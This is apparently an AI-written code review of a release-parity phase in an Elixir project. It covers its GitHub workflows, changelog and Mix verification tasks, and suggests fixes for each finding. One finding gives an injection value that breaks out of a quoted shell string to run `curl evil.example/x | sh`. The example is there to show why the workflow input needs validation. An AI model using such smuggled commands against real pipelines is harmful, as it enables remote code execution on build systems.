---
phase: 18-release-parity-gate-node-20-ci-cleanup
reviewed: 2026-04-17T14:19:32Z
depth: standard
files_reviewed: 13
files_reviewed_list:
  - .github/ISSUE_TEMPLATE/release-parity-drift.md
  - .github/workflows/ci.yml
  - .github/workflows/publish-hex.yml
  - .github/workflows/release-please.yml
  - .github/workflows/verify-published-release.yml
  - CHANGELOG.md
  - docs/releasing.md
  - lib/mix/tasks/verify.release_parity.ex
  - lib/mix/tasks/verify.workspace_clean.ex
  - mix.exs
  - test/mix/tasks/verify_release_parity_test.exs
  - test/mix/tasks/verify_workspace_clean_test.exs
  - test/mix/tasks/workflow_wiring_test.exs
findings:
  critical: 0
  warning: 3
  info: 5
  total: 8
status: issues_found
---

# Phase 18: Code Review Report

**Reviewed:** 2026-04-17T14:19:32Z
**Depth:** standard
**Files Reviewed:** 13
**Status:** issues_found

## Summary

Phase 18 adds two complementary Mix tasks (`verify.workspace_clean` and
`verify.release_parity`) plus supporting workflow wiring to close the
v1.2-era Hex-vs-main divergence. The security-sensitive surfaces cited in
the phase context check out:

- `parse_version!/1` has a strict regex guard that rejects shell
  metacharacters before any string reaches `git ls-tree` or
  `hex.package fetch`. Argv-style `System.cmd/3` calls are used
  throughout (not shell invocation), and the regex guard is covered by
  targeted unit tests (shell-meta rejection, partial version rejection,
  `v`-prefix rejection).
- `create-an-issue@v2` is correctly guarded by
  `failure() && github.event_name == 'schedule'` and the
  `issues: write` permission lives only in
  `verify-published-release.yml`. The always-on `ci.yml` keeps
  `contents: read`.
- The drift-exit-code semantics are testable because `compute/2`,
  `render_json/4`, and `retry_until!/4` are split out as pure functions
  (per Pitfall 11).

No critical bugs or security vulnerabilities were found. The findings
below are a mix of workflow consistency issues, a changelog formatting
artifact that may confuse Release Please, and a workflow-level
shell-interpolation pattern that, while gated by write access to the
repo, could be hardened to match the defense-in-depth posture of the
Elixir tasks.

## Warnings

### WR-01: Duplicate `Unreleased` sections in CHANGELOG.md

**File:** `CHANGELOG.md:7,80`
**Issue:** The changelog contains two top-level sections both labeled as
unreleased: an `## Unreleased` block at line 7 (new Phase 18 entries) and
a `## [Unreleased]` block at line 80 (legacy entry below the
Release-Please-managed `[0.2.0]` section). Release Please keys off the
`[Unreleased]` heading convention; having two distinct forms (one with
brackets, one without) either invites Release Please to ignore the new
Phase 18 entries at line 7 or to merge the stale line 80 block into the
next version bump. This is exactly the "Hex-vs-main divergence" class of
failure this phase is trying to prevent — changelog drift at publish
time.
**Fix:** Remove the legacy `## [Unreleased]` block at line 80 (its
content — "Establish release automation, package metadata checks, and a
public release checklist." — is already covered by the Release Please
managed `0.2.0` / `0.3.0` entries above it). Keep only the
`## Unreleased` block at line 7 and ensure its heading style matches
what Release Please expects (`release-please-config.json` controls
this — confirm it reads the same heading style the file uses).

### WR-02: Shell interpolation of workflow_dispatch input into `grep` without validation

**File:** `.github/workflows/publish-hex.yml:39,60`
**Issue:** Both `grep -n "@version \"${{ inputs.release_version }}\"" mix.exs`
(line 39) and `mix verify.release_publish "${{ inputs.release_version }}"`
(line 60) interpolate a raw workflow input directly into the generated
shell script. Unlike `verify.release_parity` (which validates through
`parse_version!/1` regex), these steps accept whatever string the
dispatcher typed into the GitHub UI. A value like
`0.3.0"; curl evil.example/x | sh; echo "` would break out of the quoted
context. The threat model is gated (workflow_dispatch requires repo
write access, so this is primarily a self-sabotage risk, not an
unauthenticated RCE), but it is inconsistent with the defense-in-depth
posture the Elixir tasks adopt. `release-please.yml:71,86` has the same
pattern but sourced from a release-please-controlled output, which is
lower risk.
**Fix:** Validate the input at the top of the job, before it reaches any
shell step. One option — add a guard step that re-uses the same regex
the Elixir task enforces:
```yaml
- name: Validate release_version input
  run: |
    set -euo pipefail
    if ! printf '%s' "${{ inputs.release_version }}" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9.-]+)?$'; then
      echo "release_version must be a canonical semver string" >&2
      exit 1
    fi
```
Place it before the `grep -n "@version ..."` step and before any use of
`inputs.release_version`. Alternatively, pass the input through an
`env:` binding and reference `"$RELEASE_VERSION"` in the shell script so
the value is expanded by bash (quoted) rather than spliced by
`${{ }}` into the generated script.

### WR-03: OTP version inconsistency across phase jobs (28.0 vs 28.1)

**File:** `.github/workflows/ci.yml:169`, `.github/workflows/verify-published-release.yml:62`
**Issue:** All other workflow jobs that install BEAM pin
`otp-version: "28.1"` (quality, phase5-verification, release-please
publish-hex, publish-hex recovery), but `ci.yml` phase13-verification
(line 169) and `verify-published-release.yml` (line 62) pin
`otp-version: "28.0"`. This splits the release-path jobs between two
OTP patch releases. Since the phase 18 changelog entry advertises the
"Node 24 runtime upgrade" as a cleanup of stale toolchain pins, the
matching OTP pins are an adjacent cleanup that belongs in the same
audit. Running the release-parity verifier on an older OTP than the one
that produced the tarball can also mask environmental edge cases.
**Fix:** Bump both to `"28.1"` to match the rest of the workflows:
```yaml
# .github/workflows/ci.yml line 169
          otp-version: "28.1"
# .github/workflows/verify-published-release.yml line 62
          otp-version: "28.1"
```
If there is a deliberate reason phase13-verification must stay on 28.0
(e.g., reproducing a known-bad environment), document it inline with a
comment so the next reviewer does not treat it as accidental drift.

## Info

### IN-01: `publish-hex.yml` job has no explicit `permissions:` block

**File:** `.github/workflows/publish-hex.yml:15-22`
**Issue:** `release-please.yml` and `verify-published-release.yml` both
declare explicit top-level `permissions:` blocks
(`contents: write/issues: write` and `contents: read/issues: write`
respectively), but `publish-hex.yml` has none, so the job falls back to
the repository's default `GITHUB_TOKEN` permissions. For a manual
recovery workflow that only checks out, installs, and publishes, the
minimum needed is `contents: read`.
**Fix:** Add an explicit job-level (or workflow-level) permissions
block:
```yaml
jobs:
  publish-scrypath:
    name: Publish scrypath recovery
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      HEX_API_KEY: ${{ secrets.HEX_API_KEY }}
```
This matches the pattern in `release-please.yml:43-44` for the
`publish-hex` job.

### IN-02: `parse_version!/1` regex accepts non-canonical `.` separator and rejects `+buildmeta`

**File:** `lib/mix/tasks/verify.release_parity.ex:48`
**Issue:** The regex `~r/^\d+\.\d+\.\d+([.-][A-Za-z0-9.-]+)?$/` uses the
character class `[.-]` as the prerelease separator, which admits strings
like `1.0.0.dev1` that are not canonical semver (standard uses only
`-`). Separately, the regex has no `+` in the character class, so it
rejects build metadata like `1.0.0+build.5` that canonical semver
accepts (Hex.pm does flatten `+` for ordering, but the string is still
valid input). Neither shape is currently produced by the Scrypath
release pipeline, so this is documentation-level correctness, not an
exploitable gap.
**Fix:** Tighten the regex to match canonical semver if a future version
ever needs build metadata support:
```elixir
@version_regex ~r/^\d+\.\d+\.\d+(-[A-Za-z0-9.-]+)?(\+[A-Za-z0-9.-]+)?$/
```
Or leave as-is and add a module-doc comment acknowledging the narrower
shape is intentional for Scrypath's release-please-managed version
space.

### IN-03: `retry_until!/4` prints log at attempt N even when that attempt is the final-failure attempt

**File:** `lib/mix/tasks/verify.release_parity.ex:129-146`
**Issue:** The retry loop emits `==> #{label} (attempt N/N)` before
calling `fun.()`. On the final attempt that returns `{:error, reason}`,
the control flow falls through to `Mix.raise("#{label} failed after ...
attempts\n\n#{reason}")`. The reason is included in the raise, but the
intermediate "attempt N/N" log line does not echo the last reason
(earlier failures log `Mix.shell().info(to_string(reason))`, the final
one does not). Operators reading only shell output — not the Mix
exception — will see `N/N` with no explanation before the raise
message, which is only a minor clarity issue.
**Fix:** Emit the last reason before raising, for log continuity:
```elixir
{:error, reason} ->
  Mix.shell().info(to_string(reason))
  Mix.raise("#{label} failed after #{attempts} attempts\n\n#{reason}")
```

### IN-04: `verify.workspace_clean` raises a bare `ErlangError` if `git` is not on PATH

**File:** `lib/mix/tasks/verify.workspace_clean.ex:37`, `lib/mix/tasks/verify.release_parity.ex:187,212`
**Issue:** `System.cmd("git", ...)` raises `ErlangError :enoent` when
`git` is missing from PATH. In all the wired CI paths this is fine
(`erlef/setup-beam` implies `git`), but running the task manually on a
stripped image produces a cryptic error instead of the cleaner
`Mix.raise("git not found on PATH")` message the operator-support doc
leads users to expect.
**Fix:** Optionally wrap the calls with a `System.find_executable/1`
guard, for instance at the top of `run/1`:
```elixir
unless System.find_executable("git") do
  Mix.raise("verify.workspace_clean requires `git` on PATH")
end
```
Apply the same guard at the top of `verify.release_parity.run/1` for
`git` (and consider `mix` too, since `do_fetch_hex/2` shells out to
it). Low priority — CI is the primary consumer.

### IN-05: Integration canary test in `verify_release_parity_test.exs` requires internet

**File:** `test/mix/tasks/verify_release_parity_test.exs:105-114`
**Issue:** The `@tag :integration` test shells out to
`mix verify.release_parity 0.3.0`, which hits Hex.pm's CDN and expects
an actual tarball. It is correctly excluded from the default CI test
run (`mix test --exclude integration` in `ci.yml:50`), but if a
developer runs `mix test` locally without the exclusion they may hit
real network calls and occasional CDN flakiness. The test has no
`@moduletag :integration` at the describe level, so the tag applies
only to that single test — which is correct.
**Fix:** No action required; the current wiring is the intended D-21
canary. Consider adding a comment at the test site pointing out that it
relies on the published `0.3.0` artifact (so the test has to move
forward with each new release that becomes the "known-good" baseline),
e.g.:
```elixir
@tag :integration
# D-21 canary: pinned to the earliest public release that the gate is
# known to pass against. Update whenever that baseline is superseded.
test "mix verify.release_parity 0.3.0 exits 0 against live Hex" do
```

---

_Reviewed: 2026-04-17T14:19:32Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
